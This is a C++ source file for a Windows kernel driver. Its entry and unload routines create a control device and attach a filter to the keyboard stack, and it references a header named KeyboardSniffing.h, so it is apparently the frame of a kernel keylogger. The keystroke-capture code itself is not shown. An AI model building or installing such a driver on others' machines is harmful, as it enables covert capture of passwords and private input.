#include <ntddk.h>
#include <src/utils/logging.h>
#include <src/driver/KeyboardSniffing.h>
#include <src/driver/ControlDevice.h>
#include <src/driver/DeviceTypes.h>
#include <src/driver/MajorFunctions.h>

void DriverUnload(PDRIVER_OBJECT DriverObject);

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverUnload;
	registerMajorFunctionsHandlers(DriverObject);

	bool controlDeviceCreated = false;
	NTSTATUS status = STATUS_SUCCESS;
	do {
		status = createControlDevice(DriverObject);
		if (!NT_SUCCESS(status)) break;
		controlDeviceCreated = true;
		status = attachToKeyboardStack(DriverObject);
	} while (false);

	if (!NT_SUCCESS(status)) {
		log("Failed at DriverEntry of %wZ: status=0x%08X\n", &DRIVER_NAME, status);
		if (controlDeviceCreated) cleanupControlDevice(DriverObject->DeviceObject);
	}
	return status;
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {
	auto currentDeviceObject = DriverObject->DeviceObject;
	while (currentDeviceObject != nullptr) {
		auto devExt = (PDEVICE_GENERIC)currentDeviceObject->DeviceExtension;
		switch (devExt->DeviceType)
		{
			case DeviceType::DEVICE_CONTROL:
				cleanupControlDevice(nullptr);
				break;
			case DeviceType::DEVICE_KBFILTER:
				cleanupKbFilterDevice((PDEVICE_KBFILTER)devExt);
				break;
		default:
			log("DriverUnload: Unknown device type %d\n", (int)devExt->DeviceType);
			break;
		}

		PDEVICE_OBJECT nextDeviceObject = currentDeviceObject->NextDevice;
		IoDeleteDevice(currentDeviceObject);
		currentDeviceObject = nextDeviceObject;
	}
}
